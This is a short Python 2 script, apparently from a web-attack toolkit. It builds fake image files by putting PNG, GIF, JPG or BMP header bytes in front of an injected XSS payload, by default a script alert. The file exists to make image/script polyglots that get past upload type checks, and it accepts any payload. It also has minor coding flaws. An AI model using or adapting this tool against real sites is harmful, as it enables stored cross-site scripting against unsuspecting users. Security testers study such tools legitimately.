#!/usr/bin/python
# -*- coding: iso-8859-15 -*-

import os

class ImageInjections(object):
    
    def __init__(self, payload =''):
        self._payload = payload

    def image_xss(self, filename, payload):
        """
        Create -fake- image with code XSS injected.
        """
        # check user image name input valid extensions
        root, ext = os.path.splitext(filename)
        
	# create file and inject code
        if ext.lower() in [".png", ".jpg", ".gif", ".bmp"]:
            f = open(filename, 'wb')
						                
            # check user payload input
            user_payload = payload
            if not user_payload:
                user_payload = "<script>alert('XSS')</script>"
	
            # inject each XSS specific code     
            if ext.lower() == ".png":
                content = '‰PNG' + user_payload
            elif ext.lower() == ".gif":
                content = 'GIF89a' + user_payload
            elif ext.lower() == ".jpg":
                content = 'ÿØÿà JFIF' + user_payload
            elif ext.lower() == ".bmp":
                content = 'BMFÖ' + user_payload

            # write and close
            f.write(content)
            f.close()

	    image_results = "\nCode: "+ content + "\nFile: ", root + ext
        else:
            image_results = "\nPlease select a supported extension = .PNG, .GIF, .JPG or .BMP"
        return image_results

if __name__ == '__main__':
    image_xss_injection = ImageInjections('')
    print image_xss_injection.image_xss('ImageXSSpoison.png' , "<script>alert('XSS')</script>")
